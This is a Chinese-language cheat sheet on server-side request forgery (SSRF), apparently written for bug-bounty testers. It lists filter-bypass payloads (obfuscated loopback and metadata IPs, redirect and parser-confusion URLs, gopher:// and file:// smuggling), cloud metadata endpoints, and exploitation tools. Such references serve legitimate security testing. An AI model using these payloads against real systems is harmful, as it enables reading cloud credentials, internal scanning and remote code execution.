# SSRF 服务端请求伪造

## 核心原理
服务器处理用户提供的 URL 时没有校验，让服务器向非预期目标发请求。

## 攻击目标
- 云元数据服务（AWS/GCP/阿里云）
- 本地文件读取
- 内网端口扫描
- 内网服务 RCE

## 绕过技术

### IP 混淆
| 写法 | 等价 |
|------|------|
| `http://2130706433/` | `127.0.0.1`（十进制） |
| `http://2852039166/` | `169.254.169.254`（AWS 元数据） |
| `http://0177.0.0.1/` | 八进制 |
| `http://0x7f000001` | 十六进制 |
| `http://[::]:80/` | IPv6 回环 |
| `http://127.1` | 简写 |
| `http://0/` | `0.0.0.0` |

### DNS 重绑定
- 域名在攻击者 IP 和目标 IP 之间交替解析
- 绕过只在验证时解析一次 DNS 的过滤器
- 工具：`1u.ms`、`r3dir.me`

### 302/307 跳转绕过
- 白名单域名 302 跳转到内网目标
- **307/308 保留 HTTP 方法和 Body**（对 POST SSRF 关键）
- `https://307.r3dir.me/--to/?url=http://localhost`

### URL 解析差异
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```
不同解析器（urllib2、requests、浏览器）解析结果不同。

### 协议走私
| 协议 | 用途 |
|------|------|
| `file://` | 读本地文件 |
| `gopher://` | 发原始 TCP payload（SMTP RCE） |
| `dict://` | DICT 服务交互 |
| `ldap://` | 目录服务查询 |
| `netdoc://` | Java 换行安全文件读取 |

## 云元数据端点
```
AWS:    http://169.254.169.254/latest/meta-data/
GCP:    http://metadata.google.internal/computeMetadata/v1/
阿里云:  http://100.100.100.200/latest/meta-data/
```

## 工具
- **SSRFmap** — 自动 fuzz + 利用
- **Gopherus** — 生成 gopher payload
- **See-SURF** — Python SSRF 参数扫描器
- **SSRF-Sheriff** — Go 测试工具
- **Interactsh** — OOB 交互收集器

## SRC 实战要点
- SSRF 到云元数据 = 最高赏金潜力
- SSRF 链到 RCE（如 Consul）= 严重漏洞
- 盲 SSRF 用 Interactsh 证明
- 内网端口扫描结果要文档化
